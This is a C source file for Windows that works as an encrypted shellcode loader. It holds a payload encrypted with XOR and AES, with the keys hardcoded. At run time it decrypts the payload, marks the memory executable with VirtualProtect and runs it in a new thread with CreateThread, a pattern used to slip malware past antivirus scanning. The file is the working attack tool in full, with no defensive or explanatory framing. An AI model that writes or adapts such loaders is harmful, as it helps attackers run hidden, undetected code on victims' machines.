#include <windows.h>
#include "aes.h"

typedef unsigned char int8;
typedef unsigned short int int16;
typedef unsigned int int32;

void xorEncryption(int8 *payload, size_t payload_len, int8 *key, size_t key_len)
{
    for (size_t i = 0; i < payload_len; ++i)
    {
        payload[i] ^= key[i % key_len];
    }
}
int main()
{
    unsigned char key[] = "cacahuete";

    unsigned char aeskey[] = "\xd4\x2f\xfb\x9e\x81\x93\xc1\xb0\xed\x96\x1c\x18\xd3\xfd\xd1\x3d\x79\xfa\x5c\x0f\xab\xad\x34\x80\xd5\x63\x26\xec\x49\xf6\x40\x1e";
    unsigned char aesiv[] = "\x84\xcf\x40\x7d\xb3\xd4\x09\xf6\x47\x8a\xd3\xb2\xee\x4b\xab\x6c";
    unsigned char buf[] = "\x5d\xb4\x7c\x55\x0c\x1c\x66\xcd\x38\xa6\xf1\xad\x8b\x0e\x67\x1c\x2b\x5f\xfc\x6f\xb6\x6f\x79\xab\xd7\xab\xe8\x4f\x29\x62\xfe\x73\xb7\xc0\x51\x50\xd8\x43\x50\xc6\x1e\xe5\xa9\x85\x09\x1c\x65\xae\xb8\xe8\x18\xdb\x3d\x18\x67\x50\xb5\x16\x2b\x4f\x59\x6f\x61\xe6\x08\x63\x44\x43\x43\xab\x63\x19\x5d\x03\x19\x7b\x94\x0d\x7f\x4f\x5f\x2e\x0c\xb6\xc7\x66\x7d\x01\xcb\x79\xee\xd1\x3c\xdb\x2e\x0c\xc7\xd6\xbf\xa2\xf4\xab\x7d\xe8\x13\xef\xc2\x98\xeb\x76\x67\xa2\x3e\xfb\x7e\x94\x3a\x43\x06\x40\x94\x8a\x86\xaf\x5a\x00\xe3\x91\x76\xcf\x2f\xe5\xd9\xc3\xb9\x8d\x43\x3e\x88\x37\x7c\x89\x90\xa1\x75\x51\x6b\xd3\x67\xc3\x52\xf5\x31\x07\xb4\x89\xe4\x10\xc4\x50\xb1\xf9\xa8\x78\x8e\xca\x81\xfd\x03\x85\x44\x1d\x6d\x60\xfb\x11\x77\x87\xad\x0c\x7f\x73\x42\xb8\xdb\x7f\xbc\x92\xa5\x6b\x56\xa9\x29\x4f\x5f\x68\x4e\xcc\xf3\x8b\xc7\x43\xba\xa2\x3e\x36\x00\x98\x22\xec\x28\xaf\x0d\xfe\x04\xf8\xc9\x62\xc7\xf2\xfd\x63\x2d\xa9\xa9\x3a\xb4\xcf\x34\xb7\x12\x75\x85\x42\xa0\x5c\xb2\xa9\x1b\x80\x05\xfe\x11\x27\xc7\x6d\x49\xf1\xe8\xd6\x47\xc4\x61\xd3\x02\x8c\xd9\x5d\x9f\x42\x3f\x47\xeb\x88\x71\x53\x59\x70\x0f\x8d\xe1\x04\x38\x32\xfc\xd2\xc2\x1f\xf8\x15\x2e\x9c\x4c\x26\xe7\xf8\x90\xac\xd1\x53\x5c\xa7\x54\x4d\xb6\x7c\x3e\xa9\x8d\x46\xf5\xc7\x19\xdf\x23\xfc\x3d\x1f\x2d\x0c\x2a\xd2\xa0\x55\x57\x5d\xbf\xeb\x13\x4e\x63\xc3\x18\x6a\x5e\x2f\xb9\x01\x16\x7f\x5a\x29\xab\xf2\x04\x9d\xa6\x61\x1e\x44\xd0\x16\x8b\xef\x28\xe3\x3d\x26\xab\x17\xec\x02\xc1\x7c\x4c\x95\x9b\x5f\xb6\x14\x86\x86\x9f\x9d\xb1\x48\xe4\x98\x24\xc0\xf5\x55\xe0\x7e\xd7\x03\xec\x8d\x6d\xdc\xd1\x86\x80\x03\xea\x05\xaf\x10\xd1\x20\x5d\xa5\x0d\x08\xac\x45\xca\xa4\x6f\x26\xf0\x71\x91\x29\x10\x0e\x96\x9d\xd5\x74\x7e\x61\x02\xc5\xdd\x2d\xa4\xca\xb9\xa0\x29\xa8\xb6\xad\x51\x2f\x35\xea\x12\x2d\x98\xd6\x96\xbf\xc3\xea\x38\xfb\xe4\xf8\x19\xdf\x2c\x99\x33\x8c\x8d\x8a\x1e\x2e\xd6\xfe\xa3\x6f\xaa\xf9\xf5\xcc\x23\xc3\xa2\xa4\xaf\xf5\xff\xe4\x90\x6d\x76\xea\x03\x83\x10\x75\x5d\x12\xa1\x62\x51\x38\x2f\x67\x2b\xcd\x69\x59\x5b\x67\x08\x4f\x20\x50\x43\x63\xff\x49\x42\xb6\x54\xc8\x66\x02\x10\x9d\xe5\x4d\x94\x96\xb5\x05\xcd\xb9";

    xorEncryption(buf, sizeof(buf), key, sizeof(key));

    struct AES_ctx ctx;

    AES_init_ctx_iv(&ctx, aeskey, aesiv);
    AES_CBC_decrypt_buffer(&ctx, buf, sizeof(buf));

    PVOID pBuffer = VirtualAlloc(NULL, sizeof(buf) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(pBuffer, buf, sizeof(buf));

    DWORD oldProtect = 0;

    VirtualProtect(pBuffer, sizeof(buf), PAGE_EXECUTE_READWRITE, &oldProtect);

    HANDLE hThread = CreateThread(NULL, 0, pBuffer, NULL, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);

    return 0;
}